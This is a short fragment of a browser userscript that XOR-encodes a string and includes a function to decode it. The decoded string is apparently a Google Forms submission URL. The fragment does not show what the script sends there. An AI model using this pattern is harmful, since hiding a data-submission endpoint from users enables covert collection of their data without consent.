...
$ = unsafeWindow.jQuery;
var A = "lpptw>++`kgw*ckkcha*gki+wtvae`wlaap+bkviVawtkjwa;bkvioa}9`@l0`@Fs]5tbQQk6^4=KWjRhR~JnW7g2IU\"mbu";
...
function mmBOP(enc,ind)
{
	var res="";
	for(var i=0;i<enc.length;++i)
	{
		res += String.fromCharCode(ind ^ enc.charCodeAt(i));
	}
	return res;
}